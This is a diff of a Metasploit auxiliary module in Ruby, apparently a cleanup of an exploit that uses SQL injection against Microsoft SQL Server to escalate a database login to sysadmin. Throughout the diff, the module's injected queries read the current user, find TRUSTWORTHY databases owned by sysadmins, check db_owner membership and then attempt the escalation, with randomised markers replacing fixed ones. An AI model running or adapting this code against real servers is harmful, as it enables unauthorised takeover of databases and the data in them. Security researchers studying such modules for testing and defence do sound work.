@@ -37,100 +37,112 @@ class Metasploit3 < Msf::Auxiliary
   def run
 
     # Get the database user name
-    print_status("Grabbing the database user name from #{rhost}:#{rport}...")
+    print_status("#{peer} - Grabbing the database user name from ...")
     db_user = get_username
-    print_good("Database user: #{db_user}")
-
-    # Grab sysadmin status
-    print_status("Checking if #{db_user} is already a sysadmin...")
-    sysadmin_status = check_sysadmin
-    if sysadmin_status == true
-      print_good("#{db_user} is already a sysadmin, no esclation needed.")
+    if db_user.nil?
+      print_error("#{peer} - Unable to grab user name...")
       return
     else
-      print_good("#{db_user} is NOT a sysadmin, let's try to escalate privileges.")
+      print_good("#{peer} - Database user: #{db_user}")
+    end
+
+    # Grab sysadmin status
+    print_status("#{peer} - Checking if #{db_user} is already a sysadmin...")
+    admin_status = check_sysadmin
+
+    if admin_status.nil?
+      print_error("#{peer} - Couldn't retrieve user status, aborting...")
+      return
+    elsif admin_status == '1'
+      print_error("#{peer} - #{db_user} is already a sysadmin, no esclation needed.")
+      return
+    else
+      print_good("#{peer} - #{db_user} is NOT a sysadmin, let's try to escalate privileges.")
     end
 
     # Check for trusted databases owned by sysadmins
-    print_status("Checking for trusted databases owned by sysadmins...")
+    print_status("#{peer} - Checking for trusted databases owned by sysadmins...")
     trust_db_list = check_trust_dbs
-    if !trust_db_list || trust_db_list.length == 0
-      print_error('No databases owned by sysadmin were found flagged as trustworthy.')
+    if trust_db_list.nil? || trust_db_list.length == 0
+      print_error("#{peer} - No databases owned by sysadmin were found flagged as trustworthy.")
       return
     else
       # Display list of accessible databases to user
-      print_good("#{trust_db_list.length} affected database(s) were found:")
-
-      if trust_db_list.length == 1
-        trust_db_one = trust_db_list.flatten.first
-        print_status(" - #{trust_db_one}")
-      else
-        trust_db_list.each do |db|
-          print_status(" - #{db[0]}")
-        end
+      print_good("#{peer} - #{trust_db_list.length} affected database(s) were found:")
+      trust_db_list.each do |db|
+        print_status(" - #{db}")
       end
     end
 
     # Check if the user has the db_owner role in any of the databases
-    print_status("Checking if #{db_user} has the db_owner role in any of them...")
-    dbowner_status = check_db_owner(trust_db_list)
-    if !dbowner_status
-      print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
+    print_status("#{peer} - Checking if #{db_user} has the db_owner role in any of them...")
+    owner_status = check_db_owner(trust_db_list)
+    if owner_status.nil?
+      print_error("#{peer} - Fail buckets, the user doesn't have db_owner role anywhere.")
       return
     else
-      print_good("#{db_user} has the db_owner role on #{dbowner_status}.")
+      print_good("#{peer} - #{db_user} has the db_owner role on #{owner_status}.")
     end
 
     # Attempt to escalate to sysadmin
-    print_status("Attempting to add #{db_user} to sysadmin role...")
-    escalate_privs(dbowner_status,db_user)
-    sysadmin_status = check_sysadmin
-    if sysadmin_status == true
-      print_good("Success! #{db_user} is now a sysadmin!")
+    print_status("#{peer} - Attempting to add #{db_user} to sysadmin role...")
+    escalate_privs(owner_status, db_user)
+
+    admin_status = check_sysadmin
+    if admin_status && admin_status == '1'
+      print_good("#{peer} - Success! #{db_user} is now a sysadmin!")
     else
-      print_error("Fail buckets, something went wrong.")
+      print_error("#{peer} - Fail buckets, something went wrong.")
     end
   end
 
-  #
-  # Functions
-  #
+  def peer
+    "#{rhost}:#{rport}"
+  end
 
   def get_username
     # Setup query to check for database username
-    sql = "(select 'EVILSQLISTART'+SYSTEM_USER+'EVILSQLISTOP')"
+    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
+    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
+    sql = "(select '#{clue_start}'+SYSTEM_USER+'#{clue_end}')"
 
     # Run query
     result = mssql_query(sql)
 
     # Parse result
-    parsed_result =result.body.scan( /EVILSQLISTART([^>]*)EVILSQLISTOP/).last.first
+    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
+      user_name = $1
+    else
+      user_name = nil
+    end
 
-    # Return user name
-    return parsed_result
+    user_name
   end
 
   def check_sysadmin
     # Setup query to check for sysadmin
-    sql = "(select 'EVILSQLISTART'+cast((select is_srvrolemember('sysadmin'))as varchar)+'EVILSQLISTOP')"
+    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
+    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
+    sql = "(select '#{clue_start}'+cast((select is_srvrolemember('sysadmin'))as varchar)+'#{clue_end}')"
 
     # Run query
     result = mssql_query(sql)
 
     # Parse result
-    parsed_result =result.body.scan( /EVILSQLISTART([^>]*)EVILSQLISTOP/).last.first
-
-    # Return sysadmin status
-    if parsed_result.to_i == 1
-      return true
+    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
+      status = $1
     else
-      return false
+      status = nil
     end
+
+    status
   end
 
   def check_trust_dbs
     # Setup query to check for trusted databases owned by sysadmins
-    sql = "(select cast((SELECT 'EVILSTART'+d.name+'EVILSTOP' as DbName
+    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
+    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
+    sql = "(select cast((SELECT '#{clue_start}'+d.name+'#{clue_end}' as DbName
       FROM sys.server_principals r
       INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
       INNER JOIN sys.server_principals p ON
@@ -139,33 +151,50 @@ class Metasploit3 < Msf::Auxiliary
       WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin' for xml path('')) as int))"
 
     # Run query
-    result = mssql_query(sql)
+    res = mssql_query(sql)
+
+    unless res && res.body
+      return nil
+    end
 
     #Parse results
-    parsed_result = result.body.scan(/EVILSTART(.*?)EVILSTOP/m)
+    parsed_result = res.body.scan(/#{clue_start}(.*?)#{clue_end}/m)
+
+    if parsed_result && !parsed_result.empty?
+      parsed_result.flatten!
+      parsed_result.uniq!
+    end
+
+    print_status("#{parsed_result.inspect}")
+
+    parsed_result
   end
 
   def check_db_owner(trust_db_list)
     # Check if the user has the db_owner role is any databases
     trust_db_list.each do |db|
       # Setup query
-      sql = "(select 'EVILSQLISTART'+'#{db[0]}'+'EVILSQLISTOP' as DbName
-        from [#{db[0]}].sys.database_role_members drm
-        join [#{db[0]}].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
-        join [#{db[0]}].sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
+      clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
+      clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
+      sql = "(select '#{clue_start}'+'#{db}'+'#{clue_end}' as DbName
+        from [#{db}].sys.database_role_members drm
+        join [#{db}].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
+        join [#{db}].sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
         where rp.name = 'db_owner' and mp.name = SYSTEM_USER for xml path(''))"
 
       # Run query
       result = mssql_query(sql)
 
-      # Parse result
-      parsed_result =result.body.scan( /EVILSQLISTART([^>]*)EVILSQLISTOP/).last.first
+      unless result && result.body
+        next
+      end
 
-      # Return sysadmin status
-      if parsed_result
-        return parsed_result
+      # Parse result
+      if result.body =~ /#{clue_start}([^>]*)#{clue_end}/
+        return $1
       end
     end
+
     nil
   end
 
